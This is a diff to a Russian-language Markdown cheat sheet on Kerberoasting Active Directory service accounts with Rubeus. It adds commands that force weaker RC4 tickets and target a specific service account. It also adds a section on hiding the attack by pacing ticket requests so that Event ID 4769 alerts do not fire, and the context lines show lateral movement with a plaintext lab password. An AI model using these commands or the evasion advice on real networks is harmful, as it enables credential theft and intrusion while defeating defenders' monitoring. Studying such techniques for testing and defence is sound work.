@@ -17,8 +17,11 @@ Rubeus незаменим для проведения атаки Kerberoasting
 
 Запрос TGS-билетов для всех учетных записей служб с последующим их экспортом для офлайн-взлома
 ```powershell
-Rubeus.exe kerberoast /stats /outfile:hashes.txt
+Rubeus.exe kerberoast /stats /tgtdeleg /outfile:hashes.txt
 ```
+
+- `/tgtdeleg` - Принужительное использование RC4 вместо AES 
+
 ## Порядок действий 
 
 1) Получение первоначального доступа
@@ -34,6 +37,11 @@ setspn -T TestDomain -Q */*
 ```powershell
 Get-NetUser -SPN | select samaccountname, serviceprincipalname
 ```
+
+```powershell
+.\Rubeus.exe kerberoast /user:svc_vmwaresso /nowrap
+```
+
 
 5) Запрашиваем билеты, например ps:
 ```powershell
@@ -69,11 +77,14 @@ net use \\WIN-4QHPFSI8002\c$ /user:SQLSVC Password123
 dir \\WIN-4QHPFSI8002\c$
 ```
 
+
+## Скрытие атаки
+
+Вместо того чтобы запрашивать билеты для всех сервисов сразу (что мгновенно палится по событию 4769), запрашивай по одному билету в час или только для самых критичных сервисов.
+
 ## Защита от атаки
 
 1) Использование сложного пароля!!!
 2) Конфигурация УЗ без привилегий
-3) Индикатор атаки - Event ID 4769 (Запрос TGS)
-
-4) FAST (Flexible Authentication Secure Tunneling) - это защищённый туннель внутри Kerberos, который шифрует аутентификацию, чтобы её нельзя было перехватить
-5) Armoring - использование FAST для упаковки предварительной аутентификации в криптографический тоннель
+3) Использование gMSA
+4) Индикатор атаки - Event ID 4769 (Запрос TGS)
